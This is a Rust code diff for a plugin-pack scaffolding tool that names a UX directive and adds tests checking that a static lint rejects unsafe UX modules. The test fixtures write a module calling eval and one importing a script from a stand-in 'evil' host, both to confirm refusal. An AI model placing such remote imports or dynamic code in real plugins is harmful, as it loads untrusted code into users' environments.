@@ -203,13 +203,14 @@ pub(crate) fn scaffold(dir: &Path, name: &str, args: &PackScaffoldArgs) -> Resul
 
     if args.ux {
         let (path, source) = ux_plugin_source(&names);
+        let directive = names.name.replace('_', "-");
         manifest["ux"] = json!([{
             "name": names.name,
-            "description": format!("{} page, nav row and ::{} directive.", names.title, names.name),
+            "description": format!("{} page, nav row and ::{directive} directive.", names.title),
             "entry": path,
             "contributes": {
                 "areas": ["nav", "agent.sections", "transcript.directives"],
-                "directives": [names.name.replace('_', "-")],
+                "directives": [directive],
             },
         }]);
         files.push((path, source));
@@ -598,6 +599,76 @@ mod tests {
                 assert_eq!(check.graphs, vec!["review-toolkit".to_owned()]);
             }
         }
+    }
+
+    /// `pack new --ux` on a plugins template leaves the .afb unbuilt; the
+    /// first `pack check` must still lint the UX module, and the manifest
+    /// must name the directive the module actually claims.
+    #[tokio::test]
+    async fn a_ux_scaffold_is_linted_before_its_plugin_is_built_and_names_its_directive() {
+        let root = tempfile::tempdir().unwrap();
+        let dir = root.path().join("review_toolkit");
+        let args = PackScaffoldArgs {
+            ux: true,
+            ..options(PackTemplate::PluginTool)
+        };
+        scaffold(&dir, "review_toolkit", &args).unwrap();
+        let manifest: serde_json::Value =
+            serde_json::from_slice(&std::fs::read(dir.join("manifest.json")).unwrap()).unwrap();
+        let description = manifest["ux"][0]["description"].as_str().unwrap();
+        assert!(description.contains("::review-toolkit"), "{description}");
+        assert_eq!(
+            manifest["ux"][0]["contributes"]["directives"][0],
+            "review-toolkit"
+        );
+
+        let check = super::super::check::check_dir(&dir).await;
+        assert!(check.problems.is_empty(), "{:#?}", check.problems);
+        assert_eq!(check.digest, None, "the plugin is not built yet");
+
+        let entry = dir.join(manifest["ux"][0]["entry"].as_str().unwrap());
+        std::fs::write(
+            &entry,
+            "export default { id: 'review_toolkit', register() { eval('1') } }\n",
+        )
+        .unwrap();
+        let check = super::super::check::check_dir(&dir).await;
+        assert!(
+            check
+                .problems
+                .iter()
+                .any(|p| p.contains("refused by the static lint") && p.contains("dynamic code")),
+            "{:#?}",
+            check.problems
+        );
+    }
+
+    /// `pack build` refuses a file-produced UX module the webview would
+    /// refuse, so a built archive is lint-clean by construction.
+    #[tokio::test]
+    async fn build_refuses_a_ux_module_the_lint_refuses() {
+        let root = tempfile::tempdir().unwrap();
+        let dir = root.path().join("review_toolkit");
+        let args = PackScaffoldArgs {
+            ux: true,
+            ..options(PackTemplate::Assets)
+        };
+        scaffold(&dir, "review_toolkit", &args).unwrap();
+        let check = super::super::check::check_dir(&dir).await;
+        assert!(check.problems.is_empty(), "{:#?}", check.problems);
+        let built = super::super::build::build_pack(&dir, None).unwrap();
+        assert_eq!(Some(built.digest), check.digest);
+
+        let manifest: serde_json::Value =
+            serde_json::from_slice(&std::fs::read(dir.join("manifest.json")).unwrap()).unwrap();
+        let entry = dir.join(manifest["ux"][0]["entry"].as_str().unwrap());
+        std::fs::write(&entry, "import x from 'https://evil/s.js'\nexport default { id: 'review_toolkit', register() {} }\n").unwrap();
+        let error = super::super::build::build_pack(&dir, None).unwrap_err();
+        assert!(
+            format!("{error:#}").contains("static lint refuses")
+                && format!("{error:#}").contains("non-sdk import"),
+            "{error:#}"
+        );
     }
 
     /// A shipped plan that is not what this build compiles is refused by
